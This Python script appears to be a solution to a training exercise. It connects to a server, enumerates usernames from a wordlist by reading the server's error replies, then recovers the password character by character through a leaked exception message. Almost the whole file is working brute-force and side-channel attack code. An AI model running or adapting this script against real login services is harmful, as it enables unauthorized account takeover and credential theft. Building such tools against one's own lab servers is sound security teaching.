import argparse
import os
import itertools
import socket
import string
from string import digits
from string import ascii_letters
import json

parser = argparse.ArgumentParser()
parser.add_argument("ip")
parser.add_argument("port")
args = parser.parse_args()
ip = args.ip
port = int(args.port)
client_socket = socket.socket()
address = (ip, port)
client_socket.connect(address)

lib = list(string.ascii_letters) + list(digits)
lib_list = [lib]
found = False

login = ""
password = ""


def find_login():
    file = open('logins.txt', 'r')
    lines = file.readlines()
    logins_list = [line.strip() for line in lines]
    for i in logins_list:
        user = ''
        message = {'login': i, 'password': ' '}
        response = request(json.dumps(message))
        if response == json.dumps({"result": "Wrong password!"}):
            user = i
            #client_socket.close()
            break
    return user


def find_password():
    global login
    global password
    global lib_list
    global found
    while not found:
        for i in list(itertools.product(*lib_list)):
            passw = password + "".join(i)
            message = {'login': login, 'password': passw}
            response = request(json.dumps(message))
            if response == json.dumps({"result": "Connection success!"}):
                found = True
                print(json.dumps(message))
                client_socket.close()
                break
            elif response == json.dumps({"result": "Exception happened during login"}):
                password = passw


def request(message):
    global found
    data = message.encode('utf8')
    client_socket.send(data)
    response = client_socket.recv(1024)
    response = response.decode('utf8')
    return response


def check(l):
    for i in list(itertools.product(*l)):
        message = "".join(i)
        request(message)
        if found:
            break
        lib_list.append(lib)

        
login = find_login()
find_password()
